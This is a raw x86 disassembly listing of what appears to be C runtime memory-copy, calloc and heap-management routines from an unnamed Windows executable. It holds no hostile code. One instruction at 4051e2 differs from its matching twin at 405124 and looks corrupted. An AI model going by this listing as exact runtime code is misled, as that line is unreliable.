  404c80:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404c86:	75 14                	jne    0x404c9c
  404c88:	c1 e9 02             	shr    $0x2,%ecx
  404c8b:	83 e2 03             	and    $0x3,%edx
  404c8e:	83 f9 08             	cmp    $0x8,%ecx
  404c91:	72 29                	jb     0x404cbc
  404c93:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404c95:	ff 24 95 a8 4d 40 00 	jmp    *0x404da8(,%edx,4)
  404c9c:	8b c7                	mov    %edi,%eax
  404c9e:	ba 03 00 00 00       	mov    $0x3,%edx
  404ca3:	83 e9 04             	sub    $0x4,%ecx
  404ca6:	72 0c                	jb     0x404cb4
  404ca8:	83 e0 03             	and    $0x3,%eax
  404cab:	03 c8                	add    %eax,%ecx
  404cad:	ff 24 85 c0 4c 40 00 	jmp    *0x404cc0(,%eax,4)
  404cb4:	ff 24 8d b8 4d 40 00 	jmp    *0x404db8(,%ecx,4)
  404cbb:	90                   	nop
  404cbc:	ff 24 8d 3c 4d 40 00 	jmp    *0x404d3c(,%ecx,4)
  404cc3:	90                   	nop
  404cc4:	d0 4c 40 00          	rorb   $1,0x0(%eax,%eax,2)
  404cc8:	fc                   	cld
  404cc9:	4c                   	dec    %esp
  404cca:	40                   	inc    %eax
  404ccb:	00 20                	add    %ah,(%eax)
  404ccd:	4d                   	dec    %ebp
  404cce:	40                   	inc    %eax
  404ccf:	00 23                	add    %ah,(%ebx)
  404cd1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  404cd7:	46                   	inc    %esi
  404cd8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  404cde:	02 c1                	add    %cl,%al
  404ce0:	e9 02 88 47 02       	jmp    0x287d4e7
  404ce5:	83 c6 03             	add    $0x3,%esi
  404ce8:	83 c7 03             	add    $0x3,%edi
  404ceb:	83 f9 08             	cmp    $0x8,%ecx
  404cee:	72 cc                	jb     0x404cbc
  404cf0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404cf2:	ff 24 95 a8 4d 40 00 	jmp    *0x404da8(,%edx,4)
  404cf9:	8d 49 00             	lea    0x0(%ecx),%ecx
  404cfc:	23 d1                	and    %ecx,%edx
  404cfe:	8a 06                	mov    (%esi),%al
  404d00:	88 07                	mov    %al,(%edi)
  404d02:	8a 46 01             	mov    0x1(%esi),%al
  404d05:	c1 e9 02             	shr    $0x2,%ecx
  404d08:	88 47 01             	mov    %al,0x1(%edi)
  404d0b:	83 c6 02             	add    $0x2,%esi
  404d0e:	83 c7 02             	add    $0x2,%edi
  404d11:	83 f9 08             	cmp    $0x8,%ecx
  404d14:	72 a6                	jb     0x404cbc
  404d16:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d18:	ff 24 95 a8 4d 40 00 	jmp    *0x404da8(,%edx,4)
  404d1f:	90                   	nop
  404d20:	23 d1                	and    %ecx,%edx
  404d22:	8a 06                	mov    (%esi),%al
  404d24:	88 07                	mov    %al,(%edi)
  404d26:	46                   	inc    %esi
  404d27:	c1 e9 02             	shr    $0x2,%ecx
  404d2a:	47                   	inc    %edi
  404d2b:	83 f9 08             	cmp    $0x8,%ecx
  404d2e:	72 8c                	jb     0x404cbc
  404d30:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d32:	ff 24 95 a8 4d 40 00 	jmp    *0x404da8(,%edx,4)
  404d39:	8d 49 00             	lea    0x0(%ecx),%ecx
  404d3c:	9f                   	lahf
  404d3d:	4d                   	dec    %ebp
  404d3e:	40                   	inc    %eax
  404d3f:	00 8c 4d 40 00 84 4d 	add    %cl,0x4d840040(%ebp,%ecx,2)
  404d46:	40                   	inc    %eax
  404d47:	00 7c 4d 40          	add    %bh,0x40(%ebp,%ecx,2)
  404d4b:	00 74 4d 40          	add    %dh,0x40(%ebp,%ecx,2)
  404d4f:	00 6c 4d 40          	add    %ch,0x40(%ebp,%ecx,2)
  404d53:	00 64 4d 40          	add    %ah,0x40(%ebp,%ecx,2)
  404d57:	00 5c 4d 40          	add    %bl,0x40(%ebp,%ecx,2)
  404d5b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  404d61:	44                   	inc    %esp
  404d62:	8f                   	(bad)
  404d63:	e4 8b                	in     $0x8b,%al
  404d65:	44                   	inc    %esp
  404d66:	8e e8                	mov    %eax,%gs
  404d68:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  404d6c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  404d70:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  404d74:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  404d78:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  404d7c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  404d80:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  404d84:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  404d88:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  404d8c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  404d90:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  404d94:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  404d9b:	03 f0                	add    %eax,%esi
  404d9d:	03 f8                	add    %eax,%edi
  404d9f:	ff 24 95 a8 4d 40 00 	jmp    *0x404da8(,%edx,4)
  404da6:	8b ff                	mov    %edi,%edi
  404da8:	b8 4d 40 00 c0       	mov    $0xc000404d,%eax
  404dad:	4d                   	dec    %ebp
  404dae:	40                   	inc    %eax
  404daf:	00 cc                	add    %cl,%ah
  404db1:	4d                   	dec    %ebp
  404db2:	40                   	inc    %eax
  404db3:	00 e0                	add    %ah,%al
  404db5:	4d                   	dec    %ebp
  404db6:	40                   	inc    %eax
  404db7:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  404dbd:	c9                   	leave
  404dbe:	c3                   	ret
  404dbf:	90                   	nop
  404dc0:	8a 06                	mov    (%esi),%al
  404dc2:	88 07                	mov    %al,(%edi)
  404dc4:	8b 45 08             	mov    0x8(%ebp),%eax
  404dc7:	5e                   	pop    %esi
  404dc8:	5f                   	pop    %edi
  404dc9:	c9                   	leave
  404dca:	c3                   	ret
  404dcb:	90                   	nop
  404dcc:	8a 06                	mov    (%esi),%al
  404dce:	88 07                	mov    %al,(%edi)
  404dd0:	8a 46 01             	mov    0x1(%esi),%al
  404dd3:	88 47 01             	mov    %al,0x1(%edi)
  404dd6:	8b 45 08             	mov    0x8(%ebp),%eax
  404dd9:	5e                   	pop    %esi
  404dda:	5f                   	pop    %edi
  404ddb:	c9                   	leave
  404ddc:	c3                   	ret
  404ddd:	8d 49 00             	lea    0x0(%ecx),%ecx
  404de0:	8a 06                	mov    (%esi),%al
  404de2:	88 07                	mov    %al,(%edi)
  404de4:	8a 46 01             	mov    0x1(%esi),%al
  404de7:	88 47 01             	mov    %al,0x1(%edi)
  404dea:	8a 46 02             	mov    0x2(%esi),%al
  404ded:	88 47 02             	mov    %al,0x2(%edi)
  404df0:	8b 45 08             	mov    0x8(%ebp),%eax
  404df3:	5e                   	pop    %esi
  404df4:	5f                   	pop    %edi
  404df5:	c9                   	leave
  404df6:	c3                   	ret
  404df7:	90                   	nop
  404df8:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  404dfc:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  404e00:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404e06:	75 24                	jne    0x404e2c
  404e08:	c1 e9 02             	shr    $0x2,%ecx
  404e0b:	83 e2 03             	and    $0x3,%edx
  404e0e:	83 f9 08             	cmp    $0x8,%ecx
  404e11:	72 0d                	jb     0x404e20
  404e13:	fd                   	std
  404e14:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404e16:	fc                   	cld
  404e17:	ff 24 95 40 4f 40 00 	jmp    *0x404f40(,%edx,4)
  404e1e:	8b ff                	mov    %edi,%edi
  404e20:	f7 d9                	neg    %ecx
  404e22:	ff 24 8d f0 4e 40 00 	jmp    *0x404ef0(,%ecx,4)
  404e29:	8d 49 00             	lea    0x0(%ecx),%ecx
  404e2c:	8b c7                	mov    %edi,%eax
  404e2e:	ba 03 00 00 00       	mov    $0x3,%edx
  404e33:	83 f9 04             	cmp    $0x4,%ecx
  404e36:	72 0c                	jb     0x404e44
  404e38:	83 e0 03             	and    $0x3,%eax
  404e3b:	2b c8                	sub    %eax,%ecx
  404e3d:	ff 24 85 48 4e 40 00 	jmp    *0x404e48(,%eax,4)
  404e44:	ff 24 8d 40 4f 40 00 	jmp    *0x404f40(,%ecx,4)
  404e4b:	90                   	nop
  404e4c:	58                   	pop    %eax
  404e4d:	4e                   	dec    %esi
  404e4e:	40                   	inc    %eax
  404e4f:	00 78 4e             	add    %bh,0x4e(%eax)
  404e52:	40                   	inc    %eax
  404e53:	00 a0 4e 40 00 8a    	add    %ah,-0x75ffbfb2(%eax)
  404e59:	46                   	inc    %esi
  404e5a:	03 23                	add    (%ebx),%esp
  404e5c:	d1 88 47 03 4e c1    	rorl   $1,-0x3eb1fcb9(%eax)
  404e62:	e9 02 4f 83 f9       	jmp    0xf9c39d69
  404e67:	08 72 b6             	or     %dh,-0x4a(%edx)
  404e6a:	fd                   	std
  404e6b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404e6d:	fc                   	cld
  404e6e:	ff 24 95 40 4f 40 00 	jmp    *0x404f40(,%edx,4)
  404e75:	8d 49 00             	lea    0x0(%ecx),%ecx
  404e78:	8a 46 03             	mov    0x3(%esi),%al
  404e7b:	23 d1                	and    %ecx,%edx
  404e7d:	88 47 03             	mov    %al,0x3(%edi)
  404e80:	8a 46 02             	mov    0x2(%esi),%al
  404e83:	c1 e9 02             	shr    $0x2,%ecx
  404e86:	88 47 02             	mov    %al,0x2(%edi)
  404e89:	83 ee 02             	sub    $0x2,%esi
  404e8c:	83 ef 02             	sub    $0x2,%edi
  404e8f:	83 f9 08             	cmp    $0x8,%ecx
  404e92:	72 8c                	jb     0x404e20
  404e94:	fd                   	std
  404e95:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404e97:	fc                   	cld
  404e98:	ff 24 95 40 4f 40 00 	jmp    *0x404f40(,%edx,4)
  404e9f:	90                   	nop
  404ea0:	8a 46 03             	mov    0x3(%esi),%al
  404ea3:	23 d1                	and    %ecx,%edx
  404ea5:	88 47 03             	mov    %al,0x3(%edi)
  404ea8:	8a 46 02             	mov    0x2(%esi),%al
  404eab:	88 47 02             	mov    %al,0x2(%edi)
  404eae:	8a 46 01             	mov    0x1(%esi),%al
  404eb1:	c1 e9 02             	shr    $0x2,%ecx
  404eb4:	88 47 01             	mov    %al,0x1(%edi)
  404eb7:	83 ee 03             	sub    $0x3,%esi
  404eba:	83 ef 03             	sub    $0x3,%edi
  404ebd:	83 f9 08             	cmp    $0x8,%ecx
  404ec0:	0f 82 5a ff ff ff    	jb     0x404e20
  404ec6:	fd                   	std
  404ec7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404ec9:	fc                   	cld
  404eca:	ff 24 95 40 4f 40 00 	jmp    *0x404f40(,%edx,4)
  404ed1:	8d 49 00             	lea    0x0(%ecx),%ecx
  404ed4:	f4                   	hlt
  404ed5:	4e                   	dec    %esi
  404ed6:	40                   	inc    %eax
  404ed7:	00 fc                	add    %bh,%ah
  404ed9:	4e                   	dec    %esi
  404eda:	40                   	inc    %eax
  404edb:	00 04 4f             	add    %al,(%edi,%ecx,2)
  404ede:	40                   	inc    %eax
  404edf:	00 0c 4f             	add    %cl,(%edi,%ecx,2)
  404ee2:	40                   	inc    %eax
  404ee3:	00 14 4f             	add    %dl,(%edi,%ecx,2)
  404ee6:	40                   	inc    %eax
  404ee7:	00 1c 4f             	add    %bl,(%edi,%ecx,2)
  404eea:	40                   	inc    %eax
  404eeb:	00 24 4f             	add    %ah,(%edi,%ecx,2)
  404eee:	40                   	inc    %eax
  404eef:	00 37                	add    %dh,(%edi)
  404ef1:	4f                   	dec    %edi
  404ef2:	40                   	inc    %eax
  404ef3:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  404ef9:	44                   	inc    %esp
  404efa:	8f                   	(bad)
  404efb:	1c 8b                	sbb    $0x8b,%al
  404efd:	44                   	inc    %esp
  404efe:	8e 18                	mov    (%eax),%ds
  404f00:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  404f04:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  404f08:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  404f0c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  404f10:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  404f14:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  404f18:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  404f1c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  404f20:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  404f24:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  404f28:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  404f2c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  404f33:	03 f0                	add    %eax,%esi
  404f35:	03 f8                	add    %eax,%edi
  404f37:	ff 24 95 40 4f 40 00 	jmp    *0x404f40(,%edx,4)
  404f3e:	8b ff                	mov    %edi,%edi
  404f40:	50                   	push   %eax
  404f41:	4f                   	dec    %edi
  404f42:	40                   	inc    %eax
  404f43:	00 58 4f             	add    %bl,0x4f(%eax)
  404f46:	40                   	inc    %eax
  404f47:	00 68 4f             	add    %ch,0x4f(%eax)
  404f4a:	40                   	inc    %eax
  404f4b:	00 7c 4f 40          	add    %bh,0x40(%edi,%ecx,2)
  404f4f:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  404f55:	c9                   	leave
  404f56:	c3                   	ret
  404f57:	90                   	nop
  404f58:	8a 46 03             	mov    0x3(%esi),%al
  404f5b:	88 47 03             	mov    %al,0x3(%edi)
  404f5e:	8b 45 08             	mov    0x8(%ebp),%eax
  404f61:	5e                   	pop    %esi
  404f62:	5f                   	pop    %edi
  404f63:	c9                   	leave
  404f64:	c3                   	ret
  404f65:	8d 49 00             	lea    0x0(%ecx),%ecx
  404f68:	8a 46 03             	mov    0x3(%esi),%al
  404f6b:	88 47 03             	mov    %al,0x3(%edi)
  404f6e:	8a 46 02             	mov    0x2(%esi),%al
  404f71:	88 47 02             	mov    %al,0x2(%edi)
  404f74:	8b 45 08             	mov    0x8(%ebp),%eax
  404f77:	5e                   	pop    %esi
  404f78:	5f                   	pop    %edi
  404f79:	c9                   	leave
  404f7a:	c3                   	ret
  404f7b:	90                   	nop
  404f7c:	8a 46 03             	mov    0x3(%esi),%al
  404f7f:	88 47 03             	mov    %al,0x3(%edi)
  404f82:	8a 46 02             	mov    0x2(%esi),%al
  404f85:	88 47 02             	mov    %al,0x2(%edi)
  404f88:	8a 46 01             	mov    0x1(%esi),%al
  404f8b:	88 47 01             	mov    %al,0x1(%edi)
  404f8e:	8b 45 08             	mov    0x8(%ebp),%eax
  404f91:	5e                   	pop    %esi
  404f92:	5f                   	pop    %edi
  404f93:	c9                   	leave
  404f94:	c3                   	ret
  404f95:	53                   	push   %ebx
  404f96:	56                   	push   %esi
  404f97:	8b 74 24 0c          	mov    0xc(%esp),%esi
  404f9b:	57                   	push   %edi
  404f9c:	0f af 74 24 14       	imul   0x14(%esp),%esi
  404fa1:	83 fe e0             	cmp    $0xffffffe0,%esi
  404fa4:	8b de                	mov    %esi,%ebx
  404fa6:	77 0d                	ja     0x404fb5
  404fa8:	85 f6                	test   %esi,%esi
  404faa:	75 03                	jne    0x404faf
  404fac:	6a 01                	push   $0x1
  404fae:	5e                   	pop    %esi
  404faf:	83 c6 0f             	add    $0xf,%esi
  404fb2:	83 e6 f0             	and    $0xfffffff0,%esi
  404fb5:	33 ff                	xor    %edi,%edi
  404fb7:	83 fe e0             	cmp    $0xffffffe0,%esi
  404fba:	77 3a                	ja     0x404ff6
  404fbc:	3b 1d 00 8a 40 00    	cmp    0x408a00,%ebx
  404fc2:	77 1d                	ja     0x404fe1
  404fc4:	6a 09                	push   $0x9
  404fc6:	e8 9a f5 ff ff       	call   0x404565
  404fcb:	53                   	push   %ebx
  404fcc:	e8 e5 03 00 00       	call   0x4053b6
  404fd1:	6a 09                	push   $0x9
  404fd3:	8b f8                	mov    %eax,%edi
  404fd5:	e8 ec f5 ff ff       	call   0x4045c6
  404fda:	83 c4 0c             	add    $0xc,%esp
  404fdd:	85 ff                	test   %edi,%edi
  404fdf:	75 2b                	jne    0x40500c
  404fe1:	56                   	push   %esi
  404fe2:	6a 08                	push   $0x8
  404fe4:	ff 35 a8 9b 40 00    	push   0x409ba8
  404fea:	ff 15 94 70 40 00    	call   *0x407094
  404ff0:	8b f8                	mov    %eax,%edi
  404ff2:	85 ff                	test   %edi,%edi
  404ff4:	75 22                	jne    0x405018
  404ff6:	83 3d 50 99 40 00 00 	cmpl   $0x0,0x409950
  404ffd:	74 19                	je     0x405018
  404fff:	56                   	push   %esi
  405000:	e8 91 0d 00 00       	call   0x405d96
  405005:	85 c0                	test   %eax,%eax
  405007:	59                   	pop    %ecx
  405008:	74 14                	je     0x40501e
  40500a:	eb a9                	jmp    0x404fb5
  40500c:	53                   	push   %ebx
  40500d:	6a 00                	push   $0x0
  40500f:	57                   	push   %edi
  405010:	e8 ab 0d 00 00       	call   0x405dc0
  405015:	83 c4 0c             	add    $0xc,%esp
  405018:	8b c7                	mov    %edi,%eax
  40501a:	5f                   	pop    %edi
  40501b:	5e                   	pop    %esi
  40501c:	5b                   	pop    %ebx
  40501d:	c3                   	ret
  40501e:	33 c0                	xor    %eax,%eax
  405020:	eb f8                	jmp    0x40501a
  405022:	68 40 01 00 00       	push   $0x140
  405027:	6a 00                	push   $0x0
  405029:	ff 35 a8 9b 40 00    	push   0x409ba8
  40502f:	ff 15 94 70 40 00    	call   *0x407094
  405035:	85 c0                	test   %eax,%eax
  405037:	a3 6c 99 40 00       	mov    %eax,0x40996c
  40503c:	75 01                	jne    0x40503f
  40503e:	c3                   	ret
  40503f:	83 25 64 99 40 00 00 	andl   $0x0,0x409964
  405046:	83 25 68 99 40 00 00 	andl   $0x0,0x409968
  40504d:	6a 01                	push   $0x1
  40504f:	a3 60 99 40 00       	mov    %eax,0x409960
  405054:	c7 05 58 99 40 00 10 	movl   $0x10,0x409958
  40505b:	00 00 00 
  40505e:	58                   	pop    %eax
  40505f:	c3                   	ret
  405060:	a1 68 99 40 00       	mov    0x409968,%eax
  405065:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  405068:	a1 6c 99 40 00       	mov    0x40996c,%eax
  40506d:	8d 0c 88             	lea    (%eax,%ecx,4),%ecx
  405070:	3b c1                	cmp    %ecx,%eax
  405072:	73 14                	jae    0x405088
  405074:	8b 54 24 04          	mov    0x4(%esp),%edx
  405078:	2b 50 0c             	sub    0xc(%eax),%edx
  40507b:	81 fa 00 00 10 00    	cmp    $0x100000,%edx
  405081:	72 07                	jb     0x40508a
  405083:	83 c0 14             	add    $0x14,%eax
  405086:	eb e8                	jmp    0x405070
  405088:	33 c0                	xor    %eax,%eax
  40508a:	c3                   	ret
  40508b:	55                   	push   %ebp
  40508c:	8b ec                	mov    %esp,%ebp
  40508e:	83 ec 14             	sub    $0x14,%esp
  405091:	8b 55 0c             	mov    0xc(%ebp),%edx
  405094:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405097:	53                   	push   %ebx
  405098:	56                   	push   %esi
  405099:	8b 41 10             	mov    0x10(%ecx),%eax
  40509c:	8b f2                	mov    %edx,%esi
  40509e:	2b 71 0c             	sub    0xc(%ecx),%esi
  4050a1:	8b 5a fc             	mov    -0x4(%edx),%ebx
  4050a4:	83 c2 fc             	add    $0xfffffffc,%edx
  4050a7:	57                   	push   %edi
  4050a8:	c1 ee 0f             	shr    $0xf,%esi
  4050ab:	8b ce                	mov    %esi,%ecx
  4050ad:	8b 7a fc             	mov    -0x4(%edx),%edi
  4050b0:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  4050b6:	4b                   	dec    %ebx
  4050b7:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4050ba:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  4050c1:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4050c4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4050c7:	8b 0c 13             	mov    (%ebx,%edx,1),%ecx
  4050ca:	f6 c1 01             	test   $0x1,%cl
  4050cd:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4050d0:	75 7f                	jne    0x405151
  4050d2:	c1 f9 04             	sar    $0x4,%ecx
  4050d5:	6a 3f                	push   $0x3f
  4050d7:	49                   	dec    %ecx
  4050d8:	5f                   	pop    %edi
  4050d9:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4050dc:	3b cf                	cmp    %edi,%ecx
  4050de:	76 03                	jbe    0x4050e3
  4050e0:	89 7d 0c             	mov    %edi,0xc(%ebp)
  4050e3:	8b 4c 13 04          	mov    0x4(%ebx,%edx,1),%ecx
  4050e7:	3b 4c 13 08          	cmp    0x8(%ebx,%edx,1),%ecx
  4050eb:	75 48                	jne    0x405135
  4050ed:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4050f0:	83 f9 20             	cmp    $0x20,%ecx
  4050f3:	73 1c                	jae    0x405111
  4050f5:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4050fa:	d3 ef                	shr    %cl,%edi
  4050fc:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  405100:	f7 d7                	not    %edi
  405102:	21 7c b0 44          	and    %edi,0x44(%eax,%esi,4)
  405106:	fe 09                	decb   (%ecx)
  405108:	75 2b                	jne    0x405135
  40510a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40510d:	21 39                	and    %edi,(%ecx)
  40510f:	eb 24                	jmp    0x405135
  405111:	83 c1 e0             	add    $0xffffffe0,%ecx
  405114:	bf 00 00 00 80       	mov    $0x80000000,%edi
  405119:	d3 ef                	shr    %cl,%edi
  40511b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40511e:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  405122:	f7 d7                	not    %edi
  405124:	21 bc b0 c4 00 00 00 	and    %edi,0xc4(%eax,%esi,4)
  40512b:	fe 09                	decb   (%ecx)
  40512d:	75 06                	jne    0x405135
  40512f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405132:	21 79 04             	and    %edi,0x4(%ecx)
  405135:	8b 4c 13 08          	mov    0x8(%ebx,%edx,1),%ecx
  405139:	8b 7c 13 04          	mov    0x4(%ebx,%edx,1),%edi
  40513d:	89 79 04             	mov    %edi,0x4(%ecx)
  405140:	8b 4c 13 04          	mov    0x4(%ebx,%edx,1),%ecx
  405144:	8b 7c 13 08          	mov    0x8(%ebx,%edx,1),%edi
  405148:	03 5d f8             	add    -0x8(%ebp),%ebx
  40514b:	89 79 08             	mov    %edi,0x8(%ecx)
  40514e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  405151:	8b fb                	mov    %ebx,%edi
  405153:	c1 ff 04             	sar    $0x4,%edi
  405156:	4f                   	dec    %edi
  405157:	83 ff 3f             	cmp    $0x3f,%edi
  40515a:	76 03                	jbe    0x40515f
  40515c:	6a 3f                	push   $0x3f
  40515e:	5f                   	pop    %edi
  40515f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405162:	83 e1 01             	and    $0x1,%ecx
  405165:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  405168:	0f 85 a0 00 00 00    	jne    0x40520e
  40516e:	2b 55 fc             	sub    -0x4(%ebp),%edx
  405171:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405174:	c1 f9 04             	sar    $0x4,%ecx
  405177:	6a 3f                	push   $0x3f
  405179:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40517c:	49                   	dec    %ecx
  40517d:	5a                   	pop    %edx
  40517e:	3b ca                	cmp    %edx,%ecx
  405180:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405183:	76 05                	jbe    0x40518a
  405185:	89 55 0c             	mov    %edx,0xc(%ebp)
  405188:	8b ca                	mov    %edx,%ecx
  40518a:	03 5d fc             	add    -0x4(%ebp),%ebx
  40518d:	8b fb                	mov    %ebx,%edi
  40518f:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  405192:	c1 ff 04             	sar    $0x4,%edi
  405195:	4f                   	dec    %edi
  405196:	3b fa                	cmp    %edx,%edi
  405198:	76 02                	jbe    0x40519c
  40519a:	8b fa                	mov    %edx,%edi
  40519c:	3b cf                	cmp    %edi,%ecx
  40519e:	74 6b                	je     0x40520b
  4051a0:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4051a3:	8b 51 04             	mov    0x4(%ecx),%edx
  4051a6:	3b 51 08             	cmp    0x8(%ecx),%edx
  4051a9:	75 48                	jne    0x4051f3
  4051ab:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4051ae:	83 f9 20             	cmp    $0x20,%ecx
  4051b1:	73 1c                	jae    0x4051cf
  4051b3:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4051b8:	d3 ea                	shr    %cl,%edx
  4051ba:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  4051be:	f7 d2                	not    %edx
  4051c0:	21 54 b0 44          	and    %edx,0x44(%eax,%esi,4)
  4051c4:	fe 09                	decb   (%ecx)
  4051c6:	75 2b                	jne    0x4051f3
  4051c8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4051cb:	21 11                	and    %edx,(%ecx)
  4051cd:	eb 24                	jmp    0x4051f3
  4051cf:	83 c1 e0             	add    $0xffffffe0,%ecx
  4051d2:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4051d7:	d3 ea                	shr    %cl,%edx
  4051d9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4051dc:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  4051e0:	f7 d2                	not    %edx
  4051e2:	3e 8b b0 c4 00 00 00 	mov    %ds:0xc4(%eax),%esi
  4051e9:	fe 09                	decb   (%ecx)
  4051eb:	75 06                	jne    0x4051f3
  4051ed:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4051f0:	21 51 04             	and    %edx,0x4(%ecx)
  4051f3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4051f6:	8b 51 08             	mov    0x8(%ecx),%edx
  4051f9:	8b 49 04             	mov    0x4(%ecx),%ecx
  4051fc:	89 4a 04             	mov    %ecx,0x4(%edx)
  4051ff:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405202:	8b 51 04             	mov    0x4(%ecx),%edx
  405205:	8b 49 08             	mov    0x8(%ecx),%ecx
  405208:	89 4a 08             	mov    %ecx,0x8(%edx)
  40520b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40520e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  405212:	75 09                	jne    0x40521d
  405214:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405217:	0f 84 89 00 00 00    	je     0x4052a6
  40521d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405220:	8d 0c f9             	lea    (%ecx,%edi,8),%ecx
  405223:	8b 49 04             	mov    0x4(%ecx),%ecx
  405226:	89 4a 04             	mov    %ecx,0x4(%edx)
  405229:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40522c:	8d 0c f9             	lea    (%ecx,%edi,8),%ecx
  40522f:	89 4a 08             	mov    %ecx,0x8(%edx)
  405232:	89 51 04             	mov    %edx,0x4(%ecx)
  405235:	8b 4a 04             	mov    0x4(%edx),%ecx
  405238:	89 51 08             	mov    %edx,0x8(%ecx)
  40523b:	8b 4a 04             	mov    0x4(%edx),%ecx
  40523e:	3b 4a 08             	cmp    0x8(%edx),%ecx
  405241:	75 63                	jne    0x4052a6
  405243:	8a 4c 07 04          	mov    0x4(%edi,%eax,1),%cl
  405247:	83 ff 20             	cmp    $0x20,%edi
  40524a:	88 4d 0f             	mov    %cl,0xf(%ebp)
  40524d:	fe c1                	inc    %cl
  40524f:	88 4c 07 04          	mov    %cl,0x4(%edi,%eax,1)
  405253:	73 25                	jae    0x40527a
  405255:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  405259:	75 0e                	jne    0x405269
  40525b:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  405260:	8b cf                	mov    %edi,%ecx
  405262:	d3 eb                	shr    %cl,%ebx
  405264:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405267:	09 19                	or     %ebx,(%ecx)
  405269:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  40526e:	8b cf                	mov    %edi,%ecx
  405270:	d3 eb                	shr    %cl,%ebx
  405272:	8d 44 b0 44          	lea    0x44(%eax,%esi,4),%eax
  405276:	09 18                	or     %ebx,(%eax)
  405278:	eb 29                	jmp    0x4052a3
  40527a:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  40527e:	75 10                	jne    0x405290
  405280:	8d 4f e0             	lea    -0x20(%edi),%ecx
  405283:	bb 00 00 00 80       	mov    $0x80000000,%ebx
